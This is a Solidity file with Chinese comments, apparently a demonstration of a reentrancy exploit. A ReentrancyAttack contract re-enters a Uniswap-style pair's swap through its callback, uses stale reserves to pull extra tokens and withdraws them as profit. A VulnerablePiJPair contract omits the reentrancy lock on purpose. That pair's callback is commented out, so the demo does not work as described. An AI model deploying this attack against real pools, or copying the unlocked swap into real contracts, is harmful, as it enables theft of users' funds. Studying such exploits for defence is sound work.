// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IMaliciousPiJPair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
    
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
}
interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint value
    ) external returns (bool);
}


contract ReentrancyAttack {
    IMaliciousPiJPair public pair;
    address public token0;
    address public token1;
    bool public isFirstCall = true;
    
    // 攻击记录
    uint public profitToken0;
    uint public profitToken1;
    
    constructor(address _pair) {
        pair = IMaliciousPiJPair(_pair);
        token0 = pair.token0();
        token1 = pair.token1();
    }
    
    // 开始攻击
    function startAttack(uint amount0Out, uint amount1Out) external {
        // 第一次正常调用 swap
        pair.swap(amount0Out, amount1Out, address(this), abi.encode(true));
    }
    
    // PiJCall 回调函数 - 这里是重入发生的地方
    function PiJCall(
        address sender,
        uint amount0Out,
        uint amount1Out,
        bytes calldata data
    ) external {
        require(msg.sender == address(pair), "Unauthorized");
        require(tx.origin == sender, "Invalid sender");
        
        if (isFirstCall) {
            isFirstCall = false;
            
            // 📌 关键攻击点：在第一次 swap 完成前，储备金还未更新！
            // 此时 getReserves() 返回的还是旧的储备金数据
            
            (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
            
            // console.log("The reverse of the first called:");
            // console.log("Reserve0:", reserve0);
            // console.log("Reserve1:", reserve1);
            // console.log("real balance:");
            // console.log("Balance0:", IERC20(token0).balanceOf(address(pair)));
            // console.log("Balance1:", IERC20(token1).balanceOf(address(pair)));
            
            // 利用过时的储备金数据进行第二次 swap
            // 计算一个看似"有利"的交易
            uint secondAmount0Out = calculateProfitableSwap0(reserve0, reserve1);
            uint secondAmount1Out = calculateProfitableSwap1(reserve0, reserve1);
            
            if (secondAmount0Out > 0 || secondAmount1Out > 0) {
               // console.log("Execution reentrancy attack...");
                pair.swap(secondAmount0Out, secondAmount1Out, address(this), abi.encode(false));
            }
        } else {
            // 第二次回调，记录利润
            profitToken0 = IERC20(token0).balanceOf(address(this));
            profitToken1 = IERC20(token1).balanceOf(address(this));
            
            // console.log("acctact done!");
            // console.log("get benfit Token0:", profitToken0);
            // console.log("get benfit Token1:", profitToken1);
        }
    }
    
    // 基于过时储备金计算有利的交换
    function calculateProfitableSwap0(uint reserve0, uint reserve1) internal view returns (uint) {
        // 简化的攻击逻辑：如果储备金显示有足够的流动性，就尝试套利
        // 实际攻击会更复杂，可能涉及价格操纵
        if (reserve0 > 1 ether && reserve1 > 1 ether) {
            return 0.1 ether; // 尝试获取 0.1 个 token0
        }
        return 0;
    }
    
    function calculateProfitableSwap1(uint reserve0, uint reserve1) internal view returns (uint) {
        if (reserve0 > 1 ether && reserve1 > 1 ether) {
            return 0.1 ether; // 尝试获取 0.1 个 token1
        }
        return 0;
    }
    
    // 提取攻击获得的资金
    function withdrawProfits() external {
        IERC20(token0).transfer(msg.sender, IERC20(token0).balanceOf(address(this)));
        IERC20(token1).transfer(msg.sender, IERC20(token1).balanceOf(address(this)));
    }
    
    receive() external payable {}
}

// 简化的测试合约，模拟没有 lock 的 Pair
contract VulnerablePiJPair {
    uint public unlocked = 1; // 但没有在 swap 中使用！
    uint112 public reserve0;
    uint112 public reserve1;
    address public token0;
    address public token1;
    
    mapping(address => uint) public balances;
    
    constructor(address _token0, address _token1) {
        token0 = _token0;
        token1 = _token1;
        reserve0 = 10 ether;  // 初始储备金
        reserve1 = 20 ether;
    }
    
    // 📌 漏洞版本：没有使用 lock 修饰器！
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external {
        // 这里应该要有 require(unlocked == 1); unlocked = 0; 但被故意省略了
        
        require(amount0Out > 0 || amount1Out > 0, "INSUFFICIENT_OUTPUT_AMOUNT");
        require(amount0Out < reserve0 && amount1Out < reserve1, "INSUFFICIENT_LIQUIDITY");
        
        // 转账
        if (amount0Out > 0) _safeTransfer(token0, to, amount0Out);
        if (amount1Out > 0) _safeTransfer(token1, to, amount1Out);
        
        // 外部调用 - 重入口！
        // if (data.length > 0) {
        //     IPiJCallee(to).PiJCall(msg.sender, amount0Out, amount1Out, data);
        // }
        
        // 更新余额（但储备金还是旧的！）
        uint balance0 = IERC20(token0).balanceOf(address(this));
        uint balance1 = IERC20(token1).balanceOf(address(this));
        
        // 检查常数乘积
        require(
            balance0 * balance1 >= uint(reserve0) * uint(reserve1),
            "K"
        );
        
        // 📌 问题：储备金更新发生在函数末尾！
        // 在重入期间，getReserves() 仍然返回旧值
        reserve0 = uint112(balance0);
        reserve1 = uint112(balance1);
    }
    
    function _safeTransfer(address token, address to, uint value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSignature("transfer(address,uint256)", to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }
    
    function getReserves() external view returns (uint112, uint112, uint32) {
        return (reserve0, reserve1, 0);
    }
}